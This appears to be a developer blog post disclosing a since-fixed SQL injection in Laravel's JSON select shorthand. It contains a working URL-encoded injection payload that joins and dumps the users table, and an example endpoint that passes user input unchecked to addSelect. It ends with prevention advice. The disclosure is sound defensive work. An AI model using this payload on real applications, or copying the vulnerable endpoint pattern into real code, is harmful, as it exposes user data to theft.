---
title: 'Unsafe SQL functions in Laravel'
next: new-in-php-74
meta:
    description: 'An SQL injection vulnerability in Laravel has been disclosed and fixed'
footnotes:
    - { link: /blog/laravel-custom-relation-classes, title: 'Building custom relation classes in Laravel' }
---

I recently learned that not all query builder functionality in Laravel is "safe".
This means that user input shouldn't be passed directly to it, 
as it might expose your application to SQL injection vulnerabilities.

{{ ad:carbon }}

The past few days it became clear that there is little community knowledge about these unsafe functions. 
Many developers assume, as did I, that the Laravel query builder completely prevents SQL injection attacks.

This blog post aims to raise awareness about what's safe, and what's not.

## An SQL injection vulnerability?

Let's start by mentioning that this vulnerability has been fixed as of [Laravel 5.8.11](*https://github.com/laravel/framework/commits/v5.8.11).
While technically we could call this a "vulnerability", 
Laravel developers should know that they also play a role in preventing these kinds of issues.

Let's examine the issue.

Laravel has the ability to manually specify which columns to select on a query.
It also offers the shorthand notation to query JSON data:

```
<hljs type>Blog</hljs>::<hljs prop>query</hljs>()
    -><hljs prop>addSelect</hljs>('<hljs green>title</hljs>-><hljs blue>en</hljs>');
```

```
<hljs keyword>SELECT</hljs> <hljs prop>json_extract</hljs>(`<hljs green>title</hljs>`, '$."<hljs blue>en</hljs>"') <hljs keyword>FROM</hljs> blogs;
```

Instead of manually writing `json_extract`, we can use the simplified `->` syntax, 
which Laravel will convert to the correct SQL statement.

Be careful though: Laravel won't do any escaping during this conversion. 
Consider the following example:

```
<hljs type>Blog</hljs>::<hljs prop>query</hljs>()
    -><hljs prop>addSelect</hljs>('<hljs green>title</hljs>-><hljs blue>en</hljs><hljs red>'#</hljs>');
```

By inserting `'#` in our input, we can manually close the `json_extract` function, 
and ignore the rest of the query:

```
<hljs keyword>SELECT</hljs> <hljs prop>json_extract</hljs>(`<hljs green>title</hljs>`, '$."<hljs blue>en</hljs><hljs red>'#</hljs><hljs textgrey>"') FROM blogs;</hljs>
```

This query will fail because of syntax errors, but what about the next one?

```
<hljs keyword>SELECT</hljs> <hljs prop>json_extract</hljs>(
    `<hljs green>title</hljs>`, 
    '$."<hljs blue>en</hljs><hljs red>"')) 
FROM blogs RIGHT OUTER JOIN users ON users.id <> null
#</hljs>
    <hljs textgrey>"') FROM blogs;</hljs>
```

We're adding an outer join on the `users` table. 
Essentially selecting all data in it. 

For reference, this is the URL encoded version of the malicious code:

```
<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>
```

Say we have the following endpoint in our application, to query blog posts from a public API:

```php
<hljs type>Route</hljs>::<hljs prop>get</hljs>('/posts', function (<hljs type>Request</hljs> $request) {
    $fields = $request-><hljs prop>get</hljs>('fields', []);

    $users = <hljs type>Blog</hljs>::<hljs prop>query</hljs>()-><hljs prop>addSelect</hljs>($fields)-><hljs prop>get</hljs>();

    return <hljs prop>response</hljs>()-><hljs prop>json</hljs>($users);
});
```

Consumers of this API might only be interested in a few fields, 
that's why we added a `fields` filter.
Something similar to [sparse fieldsets](*https://jsonapi.org/format/#fetching-sparse-fieldsets) from the JSON api spec.

The endpoint can now be used like this:

```
/blog?fields[]=url&fields[]=title
```

Now we insert our malicious code instead:

```
/blog?fields[]=<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>
```

It will be added to the query. And by returning the query result as JSON, 
we'll see the full contents of the users table. 

```php
<hljs type>Blog</hljs>::<hljs prop>query</hljs>()-><hljs prop>addSelect</hljs>([
    '<hljs red>%22%27%29%29+FROM+blogs+RIGHT+OUTER+JOIN+users+ON+users.id+%3C%3E+null%23</hljs>'
])-><hljs prop>get</hljs>();
```

Two things need to be in place for this attack to be possible:

- An accessible API endpoint, which allows an attacker to pass his malicious code to `select` or `addSelect`.
Chances are you're not doing this manually in your project.
Though there are popular packages which provide this functionality for easy API endpoints and URL filtering.
- The entry point table must have a column with JSON data.
Otherwise the `json_extract` function will fail, stopping our query. 
From the entry point though, you can access all data.



## Prevention?

As mentioned before, this particular vulnerability has been fixed as of [Laravel 5.8.11](*https://github.com/laravel/framework/commits/v5.8.11).
It's always good to keep up to date with the latest Laravel version.

More importantly though, developers should never allow user input directly to specify columns, without a whitelist.
In our previous example, you could prevent this attack by only allowing certain fields to be requested, 
this would prevent the issue completely.

Next, one of our widely-used packages, `spatie/laravel-querybuilder`, 
opened up `addSelect` by design. 
This meant that websites using our package, were vulnerable to the underlying issue.
We immediately fixed it and Freek [wrote about it](*https://murze.be/an-important-security-release-for-laravel-query-builder) in depth.
If you're using our package and unable to update to the latest Laravel version, 
you should immediately update the package.

Finally, the [Laravel docs](*https://laravel.com/docs/5.8/queries) have also been updated 
to warn developers not to pass user input directly to columns when using the query builder.  
